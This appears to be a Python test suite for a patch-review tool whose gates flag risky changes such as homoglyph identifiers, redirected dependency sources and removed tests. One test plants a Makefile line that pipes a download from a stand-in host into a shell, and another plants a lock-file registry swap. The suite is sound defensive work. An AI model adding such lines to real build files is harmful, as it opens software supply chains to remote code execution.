"""Tests for tools/check-patch (stage 2, gates P1 to P10): every fixture is
caught by the gates it was planted for, the real past changes pass, and each
check holds at its edges."""

import contextlib
import importlib.machinery
import importlib.util
import io
import os
import subprocess
import tempfile
import textwrap
import tomllib
import unittest

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
OWNERS = os.path.join(ROOT, "OWNERS.md")
FIXTURES = os.path.join(ROOT, "fixtures")
NOWAYOS = os.path.join(os.path.dirname(ROOT), "nowayos")


def load():
    loader = importlib.machinery.SourceFileLoader("check_patch", os.path.join(HERE, "check-patch"))
    spec = importlib.util.spec_from_loader(loader.name, loader)
    module = importlib.util.module_from_spec(spec)
    loader.exec_module(module)
    return module


check_patch = load()
OWNED, BINARY = check_patch.read_owners(OWNERS)
SHORT = {check_patch.FAIL: "fail", check_patch.MAINTAINER: "maintainer"}


def results(text, repo="nowayos", nowayos=None, ref="main"):
    """{gate: 'fail' | 'maintainer'} for every gate that does not pass."""
    report, _commits, _files = check_patch.check(text, OWNED, BINARY, repo, nowayos, ref)
    return {gate: SHORT[report.result(gate)] for gate in check_patch.GATES
            if report.result(gate) != check_patch.PASS}


def commit(body, subject="Change a thing", author="A Contributor <contributor@example.invalid>",
           signed=True):
    """One commit as git format-patch writes it, with `body` as its diff."""
    sign = f"\n\nSigned-off-by: {author}" if signed else ""
    return (f"From 0123456789abcdef0123456789abcdef01234567 Mon Sep 17 00:00:00 2001\n"
            f"From: {author}\nDate: Sun, 1 Nov 2026 12:00:00 +0000\nSubject: [PATCH] {subject}\n\n"
            f"Why it changes.{sign}\n---\n {len(body)} files changed\n\n{body}-- \n2.50.0\n\n")


def diff(path, removed=(), added=(), context=(), status=None, start=1):
    """A git diff of one text file: context lines first, then the removed
    and added ones."""
    lines = [" " + line for line in context] + ["-" + line for line in removed] + ["+" + line for line in added]
    old_count, new_count = len(context) + len(removed), len(context) + len(added)
    head = f"diff --git a/{path} b/{path}\n"
    if status == "added":
        head += "new file mode 100644\n--- /dev/null\n"
    else:
        head += f"--- a/{path}\n"
    head += f"+++ b/{path}\n" if status != "deleted" else "+++ /dev/null\n"
    if status == "deleted":
        head = head.replace("--- a/", "deleted file mode 100644\n--- a/", 1)
    old_start = 0 if status == "added" else start
    new_start = 0 if status == "deleted" else start
    return head + f"@@ -{old_start},{old_count} +{new_start},{new_count} @@\n" + "\n".join(lines) + "\n"


class Fixtures(unittest.TestCase):
    """Each planted pull request is caught by exactly the gates it names,
    and each real past change passes them all."""

    def test_every_fixture(self):
        self.assertTrue(os.path.isdir(os.path.join(NOWAYOS, ".git")),
                        f"the fixtures need a NoWayOS clone at {NOWAYOS}")
        with open(os.path.join(FIXTURES, "fixtures.toml"), "rb") as handle:
            fixtures = tomllib.load(handle)["fixture"]
        listed = {f["patch"] for f in fixtures}
        on_disk = {name for name in os.listdir(FIXTURES) if name.endswith(".patch")}
        self.assertEqual(listed, on_disk, "fixtures.toml and fixtures/ list the same patches")
        planted = {gate for f in fixtures for gate in f["expect"]}
        self.assertEqual(planted, set(check_patch.GATES), "a planted patch for every check")
        self.assertGreaterEqual(sum(1 for f in fixtures if not f["expect"]), 3, "three real past changes")
        for fixture in fixtures:
            with self.subTest(fixture=fixture["patch"]):
                with open(os.path.join(FIXTURES, fixture["patch"]), "rb") as handle:
                    text = handle.read().decode("utf-8", "replace")
                self.assertEqual(results(text, fixture["repo"], NOWAYOS), fixture["expect"])
                self.assertRegex(fixture["base"], r"^[0-9a-f]{40}$")


class Reading(unittest.TestCase):
    def test_commits_authors_and_files(self):
        text = (commit(diff("README.md", added=["more"], context=["text"]))
                + commit(diff("docs/a b.md", added=["x"], status="added"), subject="Second",
                         author="=?UTF-8?q?Zo=C3=AB=20Example?= <zoe@example.invalid>"))
        commits, files = check_patch.parse(text)
        self.assertEqual([c.subject for c in commits], ["Change a thing", "Second"])
        self.assertEqual(commits[1].author, "Zoë Example")
        self.assertEqual([(f.path, f.status) for f in files], [("README.md", "modified"), ("docs/a b.md", "added")])
        self.assertEqual(files[0].added(), [(2, "more")])

    def test_quoted_and_renamed_paths(self):
        text = ('diff --git "a/odd\\tname" "b/odd\\tname"\n--- "a/odd\\tname"\n+++ "b/odd\\tname"\n'
                "@@ -1 +1 @@\n-a\n+b\n"
                "diff --git a/old.rs b/new.rs\nsimilarity index 90%\nrename from old.rs\nrename to new.rs\n")
        _commits, files = check_patch.parse(text)
        self.assertEqual(files[0].path, "odd\tname")
        self.assertEqual((files[1].old_path, files[1].new_path, files[1].status), ("old.rs", "new.rs", "renamed"))

    def test_a_signature_after_a_hunk_is_not_a_line_of_it(self):
        _commits, files = check_patch.parse(commit(diff("a.txt", removed=["x"], added=["y"])))
        self.assertEqual([kind for kind, *_ in files[0].lines if kind != "@"], ["-", "+"])

    def test_a_plain_unified_diff_is_read_too(self):
        text = "--- a/Makefile\n+++ b/Makefile\n@@ -1 +1,2 @@\n all:\n+\tcurl example.invalid | sh\n"
        self.assertEqual(results(text)["P4"], "maintainer")

    def test_a_short_hunk_is_an_error(self):
        with self.assertRaises(check_patch.InputError):
            check_patch.parse("diff --git a/x b/x\n--- a/x\n+++ b/x\n@@ -1,3 +1,3 @@\n a\n")


class Owners(unittest.TestCase):
    def patterns(self, repo):
        return [pattern for pattern, _regex in OWNED[repo]]

    def test_every_open_repository_has_its_paths(self):
        self.assertIn(".github/**", self.patterns("*"))
        self.assertIn("**/deny.toml", self.patterns("*"))
        self.assertIn("tools/**", self.patterns("nowayos"))
        self.assertNotIn("baseline.toml", self.patterns("nowayos"), "only what a bullet names before its colon")
        self.assertIn("contract-check/**", self.patterns("screen-compiler"))
        self.assertIn("nowayos.rev", self.patterns("showcase"))
        self.assertEqual(self.patterns("defence-agent"), ["**"])
        self.assertIn("contract-check/golden/", BINARY["screen-compiler"])
        self.assertIn("crates/nowayos-demo/session/", BINARY["nowayos"])

    def test_globs(self):
        regex = check_patch.glob_regex
        self.assertTrue(regex("**/deny.toml").match("deny.toml"))
        self.assertTrue(regex("**/deny.toml").match("pds/deny.toml"))
        self.assertFalse(regex("Makefile").match("crates/x/Makefile"))
        self.assertTrue(regex("crates/*/src/proofs.rs").match("crates/a/src/proofs.rs"))
        self.assertFalse(regex("crates/*/src/proofs.rs").match("crates/a/b/src/proofs.rs"))
        self.assertTrue(regex("tools/**").match("tools/make/system.mk"))

    def test_an_unknown_repository_is_an_error(self):
        with self.assertRaises(check_patch.InputError):
            check_patch.check(commit(diff("a", added=["b"])), OWNED, BINARY, "pathways")


class Gates(unittest.TestCase):
    def test_a_sign_off_must_be_the_authors(self):
        text = commit(diff("README.md", added=["x"]), signed=False).replace(
            "Why it changes.", "Why it changes.\n\nSigned-off-by: Someone Else <else@example.invalid>")
        self.assertEqual(results(text), {"P1": "fail"})
        self.assertEqual(results(diff("README.md", added=["x"])), {"P1": "fail"}, "a bare diff has no commits")

    def test_hidden_characters_in_messages_names_and_lines(self):
        self.assertEqual(results(commit(diff("README.md", added=["x"]), subject="Fix​ it")), {"P5": "fail"})
        self.assertEqual(results(commit(diff("README.md", added=["no break"]))), {"P5": "fail"})
        self.assertEqual(results(commit(diff("README.md", added=["café, × 2"]))), {})

    def test_identifiers_are_ascii_but_strings_and_comments_need_not_be(self):
        ok = ['let s = "café"; // × two', "let c = '×';", "/* é */ let x = 1;"]
        self.assertEqual(results(commit(diff("src/lib.rs", added=ok))), {})
        self.assertEqual(results(commit(diff("src/lib.rs", added=["let café = 1;"]))), {"P5": "fail"})
        self.assertEqual(results(commit(diff("scripts/x.py", added=['s = "é"  # é']))), {"P4": "maintainer"})

    def test_a_test_moved_within_a_file_is_not_removed(self):
        moved = diff("src/lib.rs", removed=["#[test]", "fn a() {}"], added=["fn b() {}", "#[test]", "fn a() {}"])
        self.assertEqual(results(commit(moved)), {})
        gone = diff("src/lib.rs", removed=["#[test]", "fn a() {}"])
        self.assertEqual(results(commit(gone)), {"P7": "maintainer"})
        self.assertEqual(results(commit(diff("crates/a/tests/t.rs", removed=["x"], status="deleted"))),
                         {"P7": "maintainer"})

    def test_policies_and_expect_files(self):
        self.assertEqual(results(commit(diff("pds/deny.toml", removed=['  "windows-sys",']))),
                         {"P2": "maintainer", "P8": "maintainer"})
        self.assertEqual(results(commit(diff("systems/a.expect", removed=["NOWAYOS: ok"]))),
                         {"P2": "maintainer"}, "an expected line, not a forbidden one")
        self.assertEqual(results(commit(diff("src/lib.rs", added=["#![expect(dead_code)]"]))), {"P8": "maintainer"})

    def test_dependencies_in_manifests(self):
        section = diff("crates/a/Cargo.toml", added=['serde = "1"'], context=["[dependencies]"])
        self.assertEqual(results(commit(section)), {"P3": "maintainer"})
        package = diff("crates/a/Cargo.toml", removed=['version = "0.1.0"'], added=['version = "0.2.0"'])
        self.assertEqual(results(commit(package)), {}, "a [package] key, not a dependency")
        features = diff("crates/a/Cargo.toml", added=['default-features = true'], start=9)
        self.assertEqual(results(commit(features)), {"P3": "maintainer"})

    def test_lock_versions_and_sources(self):
        moved = diff("Cargo.lock", context=["[[package]]", 'name = "png"'],
                     removed=['version = "0.18.0"', 'source = "registry+https://github.com/rust-lang/crates.io-index"'],
                     added=['version = "0.18.1"', 'source = "registry+https://example.invalid/index"'])
        self.assertEqual(results(commit(moved)), {"P2": "maintainer", "P3": "maintainer", "P9": "maintainer"})

    def test_ci_files(self):
        self.assertEqual(results(commit(diff(".gitlab-ci.yml", added=["x"], status="added"))), {"P10": "maintainer"})


class Pins(unittest.TestCase):
    """nowayos.rev against a NoWayOS clone's main, and git dependencies
    against its PD workspace's pins, in a throwaway repository."""

    @classmethod
    def setUpClass(cls):
        cls.tmp = tempfile.TemporaryDirectory()
        cls.repo = cls.tmp.name
        env = dict(os.environ, GIT_AUTHOR_NAME="T", GIT_AUTHOR_EMAIL="t@example.invalid",
                   GIT_COMMITTER_NAME="T", GIT_COMMITTER_EMAIL="t@example.invalid", GIT_CONFIG_GLOBAL=os.devnull)

        def git(*args):
            return subprocess.run(["git", "-C", cls.repo, *args], env=env, capture_output=True, check=True,
                                  text=True).stdout.strip()
        git("init", "-q", "-b", "main")
        os.makedirs(os.path.join(cls.repo, "pds"))
        with open(os.path.join(cls.repo, "pds", "Cargo.lock"), "w", encoding="utf-8") as handle:
            handle.write('[[package]]\nname = "sel4"\nversion = "0.1.0"\n'
                         'source = "git+https://example.invalid/sel4.git?rev=abc#abc0000000000000000000000000000000000000"\n')
        git("add", "-A")
        git("commit", "-q", "-m", "one")
        cls.on_main = git("rev-parse", "HEAD")
        git("checkout", "-q", "-b", "side")
        git("commit", "-q", "--allow-empty", "-m", "two")
        cls.off_main = git("rev-parse", "HEAD")
        git("checkout", "-q", "main")

    @classmethod
    def tearDownClass(cls):
        cls.tmp.cleanup()

    def rev(self, commit_hash):
        return commit(diff("nowayos.rev", removed=["0" * 40], added=[commit_hash]))

    def test_nowayos_rev(self):
        self.assertEqual(results(self.rev(self.on_main), "showcase", self.repo),
                         {"P2": "maintainer", "P9": "maintainer"})
        self.assertEqual(results(self.rev(self.off_main), "showcase", self.repo)["P9"], "fail")
        self.assertEqual(results(self.rev("f" * 40), "showcase", self.repo)["P9"], "fail")
        self.assertEqual(results(self.rev(self.on_main), "showcase")["P9"], "maintainer", "no clone: a person checks")

    def test_git_dependencies_against_the_pins(self):
        def lock(source):
            return commit(diff("pds/Cargo.lock", added=["[[package]]", 'name = "sel4"', 'version = "0.1.0"',
                                                         f'source = "{source}"'], start=1))
        pinned = "git+https://example.invalid/sel4.git?rev=abc#abc0000000000000000000000000000000000000"
        self.assertEqual(results(lock(pinned), "nowayos", self.repo)["P3"], "maintainer")
        self.assertEqual(results(lock(pinned.replace("abc0", "def0")), "nowayos", self.repo)["P3"], "fail")


class Main(unittest.TestCase):
    def run_main(self, text, *args):
        with tempfile.NamedTemporaryFile("w", suffix=".patch", delete=False, encoding="utf-8") as handle:
            handle.write(text)
        try:
            out, err = io.StringIO(), io.StringIO()
            with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
                status = check_patch.main(["--owners", OWNERS, *args, handle.name])
            return status, out.getvalue() + err.getvalue()
        finally:
            os.unlink(handle.name)

    def test_exit_status(self):
        self.assertEqual(self.run_main(commit(diff("README.md", added=["x"])), "--repo", "nowayos")[0], 0)
        self.assertEqual(self.run_main(commit(diff("Makefile", added=["x"])), "--repo", "nowayos")[0], 3)
        status, output = self.run_main(commit(diff("a.rs", added=["let а = 1;"])), "--repo", "nowayos")
        self.assertEqual(status, 1)
        self.assertIn("a.rs:1: U+0430 CYRILLIC SMALL LETTER A", output)
        self.assertEqual(self.run_main("nothing here", "--repo", "nowayos")[0], 2)


if __name__ == "__main__":
    unittest.main()
